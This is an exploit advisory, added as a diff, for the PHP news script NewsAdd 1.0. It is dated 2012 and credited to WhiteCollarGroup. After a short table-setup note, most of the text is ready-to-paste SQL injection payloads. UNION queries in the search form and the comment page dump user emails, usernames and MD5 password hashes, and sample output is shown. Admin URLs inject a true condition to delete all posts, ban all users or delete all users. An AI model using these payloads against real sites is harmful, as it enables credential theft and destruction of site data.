@@ -1,0 +1,94 @@
+# Exploit Title: NewsAdd <=1.0 Multiple SQL Injection
+# Google Dork: -----------------------------------
+# Date: 2012/05/29
+# Author: WhiteCollarGroup
+# Software Link: http://phpbrasil.com/script/3tCyUs1JeL1M/newsadd--mysql
+# Version: 1.0
+# Tested on: Debian GNU/Linux
+
+Developer URL: http://tvaini.ueuo.com/
+Vulnerabilities discovered by WhiteCollarGroup
+  www.wcgroup.host56.com
+  whitecollar_group@hotmail.com
+
+If you will install NewsAdd on your system for tests, some servers have problems with tabulation.
+Therefore, replace the second query:
+--- begin ---
+CREATE TABLE IF NOT EXISTS 'comentario' (
+        'id' int(11) NOT NULL AUTO_INCREMENT,
+        'id_noticia' int(11) NOT NULL,
+        'usuario' varchar(15) NOT NULL,
+        'comentario' text NOT NULL,
+        'data' datetime NOT NULL,
+        PRIMARY_KEY('id')
+) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=15 ;
+--- end ---
+By this:
+--- begin ---
+DROP TABLE IF EXISTS `comentario`;
+CREATE TABLE `comentario` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `id_noticia` int(11) NOT NULL,
+  `usuario` varchar(15) NOT NULL,
+  `comentario` text NOT NULL,
+  `data` datetime NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
+--- end ---
+
+We discovered five SQL Injection vulnerabilities on public access.
+ _
+|_| Vulnerabilities before login
+
+ /
+|  SQL Injection on the search form
+ \
+The first vulnerability is in the search form, on index. Paste this in it:
+%' UNION ALL SELECT 1,group_concat(concat(email,0x3c3d3e,usuario,0x3c3d3e,senha,0x3c3d3e,admin,0x3c3d3e,banido)),3,4,5 from usuarios-- wc
+You will get a unique line like:
+
+admin@admin.com.br<=>admin<=>e10adc3949ba59abbe56e057f20f883e<=>1<=>0,user@email.com<=>user<=>ee11cbb19052e40b07aac0ca060c23ee<=>1<=>0
+
+Lines are separated by commas (",") and columns, by "<=>".
+In the return, we have two lines:
+
+admin@admin.com.br<=>admin<=>e10adc3949ba59abbe56e057f20f883e<=>1<=>0
+user@email.com<=>user<=>ee11cbb19052e40b07aac0ca060c23ee<=>1<=>0
+
+Here, we have the columns as follow:
+email <=> username <=> md5(password) <=> admin? <=> banned?
+
+ /
+|  SQL Injection on comments
+ \
+
+For this, you must be a user. Register on the "cadastro.php" form.
+After, access:
+http://domain/comentar.php?id=-0' union all select 1,2,3,group_concat(concat(email,0x3c3d3e,usuario,0x3c3d3e,senha,0x3c3d3e,admin,0x3c3d3e,banido)),5 from usuarios--+
+You will view a line like the previous example.
+
+
+ _
+|_| Vulnerabilities after login
+
+ /
+|  Delete all posts
+ \
+
+/admin/removerNoticia.php?id=0' or '1'='1&conf=sim
+
+
+ /
+|  Ban all users
+ \
+
+/admin/listarUsuarios.php?acao=banir&id=0' or '1'='1
+
+
+ /
+|  Delete all users
+ \
+
+/admin/removerUsuario.php?id=0' or '1'='1&conf=sim
+
+Note that if you delete all users, you will lose access to the system.
